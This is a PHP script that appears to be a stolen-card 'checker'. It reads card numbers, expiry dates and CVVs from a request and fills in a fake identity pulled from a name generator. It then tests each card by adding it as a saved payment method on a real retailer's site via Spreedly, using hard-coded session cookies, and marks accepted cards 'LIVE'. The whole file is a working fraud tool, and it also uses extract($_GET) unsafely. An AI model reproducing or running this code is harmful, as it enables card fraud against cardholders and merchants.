<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    $username = $_GET['username'];
    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);


    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.ilmakiage.com/spreedly/saved/new/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'cookie: _sp_ses.68d3=*; frontend_cid=TBmBH6rTLg0EDPwN; external_no_cache=1; success_reg=0; frontend=8326d8fcd9e3c2c34e5d71a55d9dc382; bmec=b5cfb0ff1ad0436524991c3078794efa; country=PH; AKA_A2=A; frontend_utm=1616367382; IR_gbd=ilmakiage.com; ordering=; FPID=FPID1.2.v7D%2BlY2Jbu6PTw908O50voZx7tejG8lpf0IxDq%2F6wAQ%3D.1616203860; _gcl_au=1.1.1500831815.1616367383; _gid=GA1.2.1547500659.1616367383; b_s_id=8646a903-1f96-4f0e-868d-3ac4c9151174; _scid=ad96c76a-0066-499d-8f38-d3742a7b7a5e; _hjid=9bdf69d1-4508-4181-b5e5-3f4295bf0f3c; _hjTLDTest=1; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=1; _sctr=1|1616342400000; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=nqYoCwsYvIRCuu%2FV8MmZYKe6QpR4V2W9Hybamk7KEa%2B%2BFQfHLOgBdUSAQEakR8I%3D; _pin_unauth=dWlkPU1EYzBNMkU0TmpFdFlUazVPQzAwTm1Fd0xUZzNZVFV0TkdRNVlqTmxOR1ZrTkROaw; _ga_KK3QCQ5JZ0=GS1.1.1616367264.2.1.1616367434.8; IR_9485=1616367434293%7C0%7C1616367434293%7C%7C; IR_PI=a8cb2680-8a98-11eb-baf3-06157567e462%7C1616453834293; pageviewCount=4; _uetsid=a8a414208a9811ebb9c6f7888c6cc688; _uetvid=a8a41d508a9811eb8ce967dde24fd6b1; _ga=GA1.2.1967577400.1616367383; _derived_epik=dj0yJnU9enBtcGU2R00tUU1FUHJ0bmFmREhDWmdHZjFCeGR3ckImbj1QSWhGM091YlNUUUhPQlA0QVpYQzdRJm09NyZ0PUFBQUFBR0JYejBzJnJtPWUmcnQ9QUFBQUFHQlh6eXc; _sp_id.68d3=737b37c45da11f30.1616367378.1.1616367475.1616367378',
            'referer: https://www.ilmakiage.com/spreedly/saved/new/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $get_keys = curl_exec($ch);
    $form_key = GetStr($get_keys, '<input name="form_key" type="hidden" value="', '"');
    $environment_key = GetStr(GetStr($get_keys, 'SpreedlyIntegration.init', 'ccFieldId'), 'publicKey: "', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.46',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/json',
            'Origin: https://core.spreedly.com',
            'Referer: https://core.spreedly.com/v1/embedded/number-frame.html?v=1.46',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"environment_key":"'.$environment_key.'","payment_method":{"credit_card":{"number":"'.$cc.'","verification_value":"'.$cvv.'","first_name":"'.$fname.'","last_name":"cwqece","email":"ragnarmagnus@gmail.com","month":"'.$mm.'","year":"'.$yy.'","address1":"'.$street.'","city":"'.$city.'","state":"12","zip":"'.$postcode.'","country":"US"}}}'
    ));
    $ql = curl_exec($ch);
    $token = GetStr($ql, '"payment_method":{"token":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.ilmakiage.com/spreedly/saved/add/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'cookie: _sp_ses.68d3=*; frontend_cid=TBmBH6rTLg0EDPwN; external_no_cache=1; success_reg=0; frontend=8326d8fcd9e3c2c34e5d71a55d9dc382; bmec=b5cfb0ff1ad0436524991c3078794efa; country=PH; AKA_A2=A; frontend_utm=1616367382; IR_gbd=ilmakiage.com; ordering=; FPID=FPID1.2.v7D%2BlY2Jbu6PTw908O50voZx7tejG8lpf0IxDq%2F6wAQ%3D.1616203860; _gcl_au=1.1.1500831815.1616367383; _gid=GA1.2.1547500659.1616367383; b_s_id=8646a903-1f96-4f0e-868d-3ac4c9151174; _scid=ad96c76a-0066-499d-8f38-d3742a7b7a5e; _hjid=9bdf69d1-4508-4181-b5e5-3f4295bf0f3c; _hjTLDTest=1; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=1; _sctr=1|1616342400000; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=nqYoCwsYvIRCuu%2FV8MmZYKe6QpR4V2W9Hybamk7KEa%2B%2BFQfHLOgBdUSAQEakR8I%3D; _pin_unauth=dWlkPU1EYzBNMkU0TmpFdFlUazVPQzAwTm1Fd0xUZzNZVFV0TkdRNVlqTmxOR1ZrTkROaw; _ga_KK3QCQ5JZ0=GS1.1.1616367264.2.1.1616367489.60; IR_9485=1616367489431%7C0%7C1616367489431%7C%7C; IR_PI=a8cb2680-8a98-11eb-baf3-06157567e462%7C1616453889431; pageviewCount=5; _uetsid=a8a414208a9811ebb9c6f7888c6cc688; _uetvid=a8a41d508a9811eb8ce967dde24fd6b1; _ga=GA1.2.1967577400.1616367383; _gat_UA-100864031-1=1; _derived_epik=dj0yJnU9V2FKS1o2LXZkbnR4SF9wa0t0VlhnVURtQzVncUgtSkkmbj1McHdncXZ2R2hpSUJCVmczYVBoblV3Jm09NyZ0PUFBQUFBR0JYejRJJnJtPWUmcnQ9QUFBQUFHQlh6MHM; _sp_id.68d3=737b37c45da11f30.1616367378.1.1616367510.1616367378',
            'Origin: https://www.ilmakiage.com',
            'referer: https://www.ilmakiage.com/spreedly/saved/new/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "paymentMethodToken=$token&cc-exp-month=$mm&cc-exp-year=".substr($yy, 2, 4)."&form_key=$form_key&firstname=$fname&lastname=$lname&billing%5Bcompany%5D=&billing%5Bstreet%5D%5B%5D=$street&billing%5Bstreet%5D%5B%5D=&billing%5Bcity%5D=$city&billing%5Bregion_id%5D=12&billing%5Bregion%5D=&billing%5Bpostcode%5D=$postcode&billing%5Bcountry_id%5D=US"
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $respo = GetStr($execute, 'Reason: ', '.');


    if(strpos($execute, 'New Payment Method has been added')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Approved</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
?>